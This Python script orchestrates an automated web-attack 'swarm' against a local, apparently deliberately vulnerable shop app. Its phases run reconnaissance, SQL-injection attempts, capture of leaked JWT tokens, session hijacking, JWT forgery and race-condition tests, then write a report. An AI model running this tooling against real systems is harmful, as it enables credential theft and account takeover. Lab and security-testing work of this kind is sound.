#!/usr/bin/env python3
"""
NOVA AGENT SWARM v2.0 - FIXED DEADLOCK
Sequential agent execution with proper coordination.
All 6 agents run in coordinated phases, not competing threads.
"""

import json, time, re, sys, os
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nova_adaptive_brain import NovaAdaptiveBrain
from nova_exploit_synthesizer import NovaExploitSynthesizer
from nova_fuzzer_fix import NovaFuzzer
from nova_session_hijacker import NovaSessionHijacker
from nova_race_engine import NovaRaceEngine
from nova_jwt_forge import NovaJWTForge
from nova_feedback_cortex import NovaFeedbackCortex
from nova_code_reasoner_v2 import NovaCodeReasoner


class NovaSwarmV2:
    """Fixed swarm with phase-based execution. Each phase feeds the next."""

    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.kg = {
            "endpoints": {},
            "findings": [],
            "tokens": [],
            "paths": [],
            "exploit_queue": [],
            "log": [],
        }
        self.start_time = None

    def log(self, agent, msg):
        entry = f"[{datetime.now().strftime('%H:%M:%S')}] [{agent}] {msg}"
        print(f"  {entry}")
        self.kg["log"].append(entry)

    def phase_1_recon(self):
        """ReconAgent: Map entire attack surface."""
        self.log("ReconAgent", "🟢 Mapping attack surface...")
        brain = NovaAdaptiveBrain(base_url=self.base_url)
        
        endpoints = [
            "/rest/products/search", "/rest/user/login", "/rest/user/register",
            "/rest/user/whoami", "/api/Feedbacks", "/api/Users",
            "/rest/admin/application-configuration", "/rest/order-history",
            "/file-serving", "/rest/basket/1",
        ]
        
        for ep in endpoints:
            profile = brain.profile_endpoint(ep)
            rating = profile.get("attack_surface_rating", "LOW")
            score = profile.get("attack_score", 0)
            self.kg["endpoints"][ep] = profile
            
            if rating in ["CRITICAL", "HIGH"]:
                self.kg["exploit_queue"].append({"endpoint": ep, "score": score, "profile": profile})
            
            # Extract paths
            for key, val in profile.get("behavior", {}).items():
                if "leak" in key:
                    paths = re.findall(r'(/[\w/.-]+\.[\w]+)', str(val))
                    for p in paths:
                        if p not in self.kg["paths"]:
                            self.kg["paths"].append(p)
            
            self.log("ReconAgent", f"{ep} → {rating} (Score: {score})")
            time.sleep(0.1)
        
        self.kg["exploit_queue"].sort(key=lambda x: x["score"], reverse=True)
        self.log("ReconAgent", f"Mapped {len(endpoints)} endpoints. {len(self.kg['exploit_queue'])} queued for exploit. {len(self.kg['paths'])} paths leaked.")

    def phase_2_exploit(self):
        """ExploitAgent: Attack all queued targets."""
        self.log("ExploitAgent", "🔴 Executing targeted exploits...")
        synth = NovaExploitSynthesizer(base_url=self.base_url)
        fuzzer = NovaFuzzer(base_url=self.base_url)
        
        for target in self.kg["exploit_queue"][:5]:
            ep = target["endpoint"]
            profile = target.get("profile", {})
            leaks = profile.get("behavior", {})
            
            # Determine attack type
            if leaks.get("leaks_sql"): sink = "sql_injection"
            elif leaks.get("leaks_stack"): sink = "sql_injection"
            elif leaks.get("leaks_auth"): sink = "auth_bypass"
            else: sink = "sql_injection"
            
            self.log("ExploitAgent", f"Attacking {ep} ({sink})")
            
            synth.exploit_path(
                path=[{"endpoint": ep, "method": "GET", "params": ["q"]}],
                sink_type=sink, confidence="HIGH"
            )
            
            for r in synth.results:
                if r.get("success") == True:
                    ind = r.get("indicators_found", [])
                    sev = "critical" if any(i in ind for i in ["password", "admin", "token"]) else "high"
                    finding = {
                        "type": r.get("exploit_type", "unknown"), "endpoint": ep,
                        "payload": r.get("payload", ""), "data_exposed": ind,
                        "severity": sev, "agent": "ExploitAgent",
                    }
                    self.kg["findings"].append(finding)
                    self.log("ExploitAgent", f"🔥 {r['exploit_type']}: {ind}")
                    
                    # Extract tokens
                    tokens = re.findall(r'(eyJ[A-Za-z0-9\-._~+/]+=*)', r.get("response_preview", ""))
                    for tok in tokens:
                        if len(tok) > 50 and tok not in self.kg["tokens"]:
                            self.kg["tokens"].append(tok)
                            self.log("ExploitAgent", f"🔑 Token captured!")
            
            time.sleep(0.2)
        
        self.log("ExploitAgent", f"Phase complete. {len(self.kg['findings'])} findings, {len(self.kg['tokens'])} tokens.")

    def phase_3_auth(self):
        """AuthAgent: Use captured tokens for privilege escalation."""
        if not self.kg["tokens"]:
            self.log("AuthAgent", "No tokens to exploit. Skipping.")
            return
        
        self.log("AuthAgent", "🟣 Escalating with captured tokens...")
        token = self.kg["tokens"][0]
        
        # Session hijacking
        hijacker = NovaSessionHijacker(base_url=self.base_url)
        report = hijacker.run_full_hijack(initial_token=token)
        
        if report.get("fixation_results"):
            for r in report["fixation_results"]:
                if r.get("success"):
                    self.kg["findings"].append({
                        "type": "session_fixation", "endpoint": r.get("endpoint", ""),
                        "severity": "medium", "agent": "AuthAgent",
                    })
                    self.log("AuthAgent", "🔥 Session fixation confirmed!")
        
        # JWT forgery
        forge = NovaJWTForge(base_url=self.base_url)
        jwt_report = forge.run_full_forge(token)
        
        if jwt_report.get("successful_forgeries"):
            self.kg["findings"].append({
                "type": "jwt_forgery", "count": len(jwt_report["successful_forgeries"]),
                "severity": "critical", "agent": "AuthAgent",
            })
            self.log("AuthAgent", "🔥 JWT forgery successful!")
        
        self.log("AuthAgent", f"Auth phase complete.")

    def phase_4_code(self):
        """CodeAgent: Analyze leaked paths for source-level vulnerabilities."""
        if len(self.kg["paths"]) < 3:
            self.log("CodeAgent", "Not enough paths. Skipping.")
            return
        
        self.log("CodeAgent", f"💜 Analyzing {len(self.kg['paths'])} leaked paths...")
        reasoner = NovaCodeReasoner(base_url=self.base_url)
        report = reasoner.run_full_analysis(leaked_paths=self.kg["paths"])
        
        for finding in report.get("findings", []):
            self.kg["findings"].append({
                "type": finding["vulnerability_type"],
                "endpoint": finding["endpoint"],
                "theory": finding["theory"],
                "source_file": finding.get("source_file", ""),
                "source_line": finding.get("source_line", 0),
                "severity": "high",
                "agent": "CodeAgent",
            })
            self.log("CodeAgent", f"🔥 {finding['vulnerability_type']} traced to {finding.get('source_file', '?')}:{finding.get('source_line', '?')}")
        
        self.log("CodeAgent", f"Code analysis complete.")

    def phase_5_race(self):
        """RaceAgent: Test for race conditions and rate limiting."""
        self.log("RaceAgent", "🟠 Testing race conditions...")
        racer = NovaRaceEngine(base_url=self.base_url)
        report = racer.run_full_race_suite(auth_token=self.kg["tokens"][0] if self.kg["tokens"] else None)
        
        for attack in report.get("attacks", []):
            if attack.get("vulnerable"):
                sev = "high" if attack.get("attack_type") == "rate_limit_bypass" else "medium"
                self.kg["findings"].append({
                    "type": attack.get("attack_type", "race_condition"),
                    "detail": str(attack)[:200],
                    "severity": sev,
                    "agent": "RaceAgent",
                })
                self.log("RaceAgent", f"🔥 {attack.get('attack_type')} confirmed!")
        
        self.log("RaceAgent", f"Race testing complete. {report.get('vulnerable_count', 0)} found.")

    def phase_6_validate(self):
        """ValidationAgent: Deduplicate and verify findings."""
        self.log("ValidationAgent", "🟡 Validating findings...")
        
        # Remove duplicates
        seen = set()
        unique = []
        for f in self.kg["findings"]:
            key = (f.get("type"), f.get("endpoint"))
            if key not in seen:
                seen.add(key)
                unique.append(f)
        
        duplicates = len(self.kg["findings"]) - len(unique)
        self.kg["findings"] = unique
        self.log("ValidationAgent", f"Removed {duplicates} duplicates. {len(unique)} unique findings.")

    def phase_7_report(self):
        """ReportAgent: Generate final mission report."""
        self.log("ReportAgent", "📊 Generating final report...")
        
        findings = self.kg["findings"]
        critical = [f for f in findings if f.get("severity") == "critical"]
        high = [f for f in findings if f.get("severity") == "high"]
        medium = [f for f in findings if f.get("severity") == "medium"]
        
        report = {
            "timestamp": datetime.now().isoformat(),
            "target": self.base_url,
            "mission_duration_seconds": round(time.time() - self.start_time, 2),
            "agents_executed": ["Recon", "Exploit", "Auth", "Code", "Race", "Validate"],
            "total_findings": len(findings),
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium),
            "tokens_captured": len(self.kg["tokens"]),
            "paths_leaked": len(self.kg["paths"]),
            "findings": findings,
        }
        
        with open("nova_swarm_v2_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)
        
        elapsed = report["mission_duration_seconds"]
        print(f"""
╔══════════════════════════════════════════════╗
║        SWARM MISSION COMPLETE               ║
╠══════════════════════════════════════════════╣
║  Time: {elapsed:.1f}s  |  Agents: 6                    ║
║  Findings: {len(findings):<3}  |  Critical: {len(critical):<3}  |  High: {len(high):<3}  |  Med: {len(medium):<3}    ║
║  Tokens: {len(self.kg['tokens']):<3}  |  Paths: {len(self.kg['paths']):<3}                        ║
╚══════════════════════════════════════════════╝""")
        
        if critical:
            print("🔥 CRITICAL FINDINGS:")
            for f in critical:
                print(f"   💀 [{f['agent']}] {f['type']}: {f.get('endpoint', '?')}")
        if high:
            print("⚠️  HIGH FINDINGS:")
            for f in high:
                print(f"   ⚡ [{f['agent']}] {f['type']}: {f.get('endpoint', '?')}")
        
        print(f"\n📁 Report: nova_swarm_v2_report.json")
        return report

    def run_full_swarm(self):
        """Execute all phases in coordinated sequence."""
        self.start_time = time.time()
        
        print("""
╔══════════════════════════════════════════════════════════════╗
║   🦅  NOVA AGENT SWARM v2.0 — PHASED DEPLOYMENT  🦅       ║
║   Recon → Exploit → Auth → Code → Race → Validate          ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        try:
            self.phase_1_recon()
            self.phase_2_exploit()
            self.phase_3_auth()
            self.phase_4_code()
            self.phase_5_race()
            self.phase_6_validate()
            self.phase_7_report()
        except KeyboardInterrupt:
            print("\n  ⚠️ Swarm interrupted!")
        except Exception as e:
            print(f"\n  ❌ Error: {str(e)[:200]}")
        
        return self.kg


if __name__ == "__main__":
    swarm = NovaSwarmV2(base_url="http://localhost:3000")
    swarm.run_full_swarm()
